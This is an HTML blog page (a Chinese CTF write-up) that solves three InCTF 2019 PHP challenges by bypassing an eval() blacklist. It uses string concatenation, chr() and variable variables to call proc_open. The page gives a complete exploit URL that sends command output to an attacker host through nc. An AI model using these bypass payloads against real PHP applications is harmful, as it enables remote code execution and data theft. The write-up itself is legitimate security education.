@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>InCTF 2019 - （PHP + 1, PHP + 1.5 and PHP + 2.5）三道题的复现 - Lamber&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lamber,"> 
+    <meta name="description" content="题目描述这篇writeup是关于这次比赛 PHP+1, PHP+1.5和PHP+2.5这三道代码审计题目的。我们可以用同一个payload来解决这三道题目。这三道题的考点是全部相同的: Bypass,"> 
+    <meta name="author" content="Lamber"> 
+    <link rel="alternative" href="atom.xml" title="Lamber&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lamber&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">InCTF 2019 - （PHP + 1, PHP + 1.5 and PHP + 2.5）三道题的复现</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">InCTF 2019 - （PHP + 1, PHP + 1.5 and PHP + 2.5）三道题的复现</h1>
+        <div class="stuff">
+            <span>八月 26, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这篇writeup是关于这次比赛 <code>PHP+1</code>, <code>PHP+1.5</code>和<code>PHP+2.5</code>这三道代码审计题目的。我们可以用同一个payload来解决这三道题目。这三道题的考点是全部相同的: <strong>Bypass the WAF and get a shell</strong></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先看第一道题（PHP+1），打开题目链接就能直接获取到题目代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP+1</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面的代码简单来说就是，我们需要传入两个参数：<code>input</code>和<code>thisfile</code>。<br>对于参数<code>thisfile</code>我们可以给它传入一个目录路径来绕过<code>is_file</code>，<code>file_existes</code>这两个函数的检测。<br>绕过这两个函数的检测之后，接下来我们要想办法绕过<code>check</code>函数，这个函数将获取所有PHP的系统内置函数，并检查我们的输入是否含有这些系统内置函数。如果检测到输入了系统内置函数，那么就会被check。</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/1.png" class="">
+
+<p>下一道题（PHP+1.5），同样直接打开题目链接就能获取到题目源码，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php+1.5</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/i&quot;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you really you need that?&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题和之前那道题的不同点在于，我们的输入会再被参数<code>blacklist</code>过滤一遍。所以在上一道题甚至可以用<code>eval</code>去执行一些代码。因为<code>eval</code>并不是一个函数，详情见PHP手册英文版（中文版翻译有误差）。PHP手册中写到<code>eval</code>是一个<code>language construct</code>。进一步查询可以知道，在PHP中有很多<code>words</code>都是<code>language construct</code></p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/2.png" class="">
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/3.png" class="">
+
+<p>最后再来观察第三道题（PHP+2.5），源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP+2.5</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/i&quot;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you really you need that?&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$input</span>) &gt; <span class="number">100</span>) &#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is getting really large input...&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP+2.5与上面两道相比，它的限制条件更加苛刻，要求参数input的长度小于100字符</p>
+<h2 id="构造Payload一穿三"><a href="#构造Payload一穿三" class="headerlink" title="构造Payload一穿三"></a>构造Payload一穿三</h2><p>第一步是想办法执行<code>phpinfo()</code>，然后在phpinfo中查找<code>disable_functions</code>。想办法找到可以利用的函数去getshell。仔细查找之后，发现<code>.</code>与<code>$</code>不在<code>$blacklist</code>里面。这两个字符将会有助于我们绕过<code>preg_match</code>的过滤。<br>我们可以利用PHP字符串拼接的方式去构造出phpinfo，payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=p.h.p.i.n.f.o;<span class="variable">$a</span>();</span><br></pre></td></tr></table></figure>
+<p>虽然这种拼接方式，php可能会报一些警告，但是并不会报错。是能够正常执行的。</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/4.png" class="">
+
+<p>我们利用拼接好的payload去尝试读取phpinfo。成功读到phpinfo。<code>disable_functions</code>如下</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl<span class="built_in">_</span>alarm,pcntl<span class="built_in">_</span>fork,pcntl<span class="built_in">_</span>waitpid,pcntl<span class="built_in">_</span>wait,pcntl<span class="built_in">_</span>wifexited,pcntl<span class="built_in">_</span>wifstopped,pcntl<span class="built_in">_</span>wifsignaled,pcntl<span class="built_in">_</span>wifcontinued,pcntl<span class="built_in">_</span>wexitstatus,pcntl<span class="built_in">_</span>wtermsig,pcntl<span class="built_in">_</span>wstopsig,pcntl<span class="built_in">_</span>signal,pcntl<span class="built_in">_</span>signal<span class="built_in">_</span>get<span class="built_in">_</span>handler,pcntl<span class="built_in">_</span>signal<span class="built_in">_</span>dispatch,pcntl<span class="built_in">_</span>get<span class="built_in">_</span>last<span class="built_in">_</span>error,pcntl<span class="built_in">_</span>strerror,pcntl<span class="built_in">_</span>sigprocmask,pcntl<span class="built_in">_</span>sigwaitinfo,pcntl<span class="built_in">_</span>sigtimedwait,pcntl<span class="built_in">_</span>exec,pcntl<span class="built_in">_</span>getpriority,pcntl<span class="built_in">_</span>setpriority,pcntl<span class="built_in">_</span>async<span class="built_in">_</span>signals,exec,system,shell<span class="built_in">_</span>exec,popen,passthru,link,symlink,syslog,imap<span class="built_in">_</span>open,ld,error<span class="built_in">_</span>log,mail,file<span class="built_in">_</span>put<span class="built_in">_</span>contents,scandir,file<span class="built_in">_</span>get<span class="built_in">_</span>contents,readfile,fread,fopen,chdir	</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/5.png" class="">
+
+<p>仔细观察，发现<code>proc_open</code>函数并没有被ban掉。这也是一穿三的关键所在。查看<code>proc_open</code>的函数手册，我们发现这个函数需要传入三个参数：<strong>我们想要执行的命令和两个数组</strong>。第一个数组是一个文件描述符的数组。就像下面一样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;r&#x27;</span>),</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;w&#x27;</span>),</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>而在利用它来直接构造payload的时候发现，如果直接将其加入payload，会造成payload超出限制长度的问题。这时候可以巧妙的利用$_GET请求来发送数组。本地测试如下</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot; arr[0][]=pipe<span class="built_in">&amp;</span>arr[0][]=r<span class="built_in">&amp;</span>arr[1][]=pipe<span class="built_in">&amp;</span>arr[1][]=w<span class="built_in">&amp;</span>arr[2][]=pipe<span class="built_in">&amp;</span>arr[2][]=w &quot;</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/6.png" class="">
+
+
+<p>为了调用<code>proc_open</code>，我们可以再次使用PHP字符串拼接的方式。但是这时候遇到一个问题，我们发现下划线居然被过滤了，简直丧心病狂。最后可以拼接出一个<code>chr</code>函数。利用ascii编码来绕过下划线过滤</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/7.png" class="">
+
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>b=ch.r;<span class="built_in">$</span>u=<span class="built_in">$</span>b(95);</span><br></pre></td></tr></table></figure>
+<p>然后将构造好的下划线拼到<code>proc_open</code>中</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>e=pr.oc.<span class="built_in">$</span>u.op.en;</span><br></pre></td></tr></table></figure>
+<p>接下来我们需要想办法构造一个GET传参，以获取传入的描述数组。可以利用PHP的可变变量去构造，先构造一个<code>_GET</code>，然后再<code>$$_GET</code>，即可。</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>k=<span class="built_in">$</span>u.G.E.T;<span class="built_in">$</span>g=<span class="built_in">$</span><span class="built_in">$</span>k;</span><br></pre></td></tr></table></figure>
+
+<p>现在，一切都准备好了。再来回顾一下，<code>proc_open</code>需要三个参数<code>(要执行的命令, 一个索引数组, 命令的初始工作目录)</code><br>我们可以使用<code>current</code>和<code>next</code>这两个函数去构造payload。但是这时需要注意的一个问题是。URL上的第一个变量一定要是我们要执行的命令，第二个变量是描述数组</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/8.png" class="">
+<p>我们可以利用以上条件，将payload构造成大概长这个样子</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-address/?p=command<span class="built_in">&amp;</span>arr[][]=descriptor-array<span class="built_in">&amp;</span>input=payload<span class="built_in">&amp;</span>thisfile=/var/</span><br></pre></td></tr></table></figure>
+<p>但是有个问题，我们不知道应该怎么去查询flag文件的位置。这时可以使用<code>glob</code>函数去寻找文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo im&#x27;</span>.<span class="string">&#x27;plode(&quot;a&quot;,gl&#x27;</span>.<span class="string">&#x27;ob(&quot;*&quot;));&#x27;</span>);&amp;thisfile=/<span class="keyword">var</span>/</span><br><span class="line"><span class="comment">// 这里有个取巧的地方是，我们只在第一道题查询了flag文件的位置（只有第一道题能够使用eval）。然后在后面两道题目中我们猜测flag的位置是固定不变的。事实证明，果然如此。</span></span><br></pre></td></tr></table></figure>
+<p>我们准备读取<code>/flag</code>文件，但是发现权限不够。这时候发现同目录下面还有一个<code>/readFlag</code>的可执行文件。利用这个可执行文件，顺利拿到flag。</p>
+<p>关键部分payload构造如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=ch.r;</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$b</span>(<span class="number">95</span>);</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$u</span>.G.E.T;</span><br><span class="line"><span class="variable">$c</span>=cur.rent;</span><br><span class="line"><span class="variable">$n</span>=ne.xt;</span><br><span class="line"><span class="variable">$g</span>=<span class="variable">$$k</span>;</span><br><span class="line"><span class="variable">$e</span>=pr.oc.<span class="variable">$u</span>.op.en;</span><br><span class="line"><span class="variable">$e</span>(<span class="variable">$c</span>(<span class="variable">$g</span>),<span class="variable">$n</span>(<span class="variable">$g</span>),<span class="variable">$j</span>);</span><br><span class="line"><span class="comment">// proc_open(current($$_GET),next($$_GET),$j);</span></span><br></pre></td></tr></table></figure>
+
+<p>完整payload如下（input最终长度为97个字符）<br><code>http://xxx.xxx.xx/?p=/readFlag /flag | nc your-ip port&amp;arr[0][]=pipe&amp;arr[0][]=r&amp;arr[1][]=pipe&amp;arr[1][]=w&amp;arr[2][]=pipe&amp;arr[2][]=w&amp;input=$b=ch.r;$u=$b(95);$k=$u.G.E.T;$c=cur.rent;$n=ne.xt;$g=$$k;$e=pr.oc.$u.op.en;$e($c($g),$n($g),$j);$thisfile=/var/</code></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/1815162101.mp3">
+            </audio>
+            
+        </div>
+        
